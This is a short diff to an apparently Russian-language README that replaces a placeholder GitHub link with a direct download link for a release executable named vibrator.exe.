@@ -5,4 +5,4 @@
 ## 🚀 Скачать готовый релиз
 Нажмите на ссылку ниже, чтобы скачать исполняемый файл напрямую:
 
-### 📥 [СКАЧАТЬ VIBRATOR.EXE](https://github.com)
+### 📥 [СКАЧАТЬ VIBRATOR.EXE](https://github.com/learning-c/releases/download/v1.5/vibrator.exe)
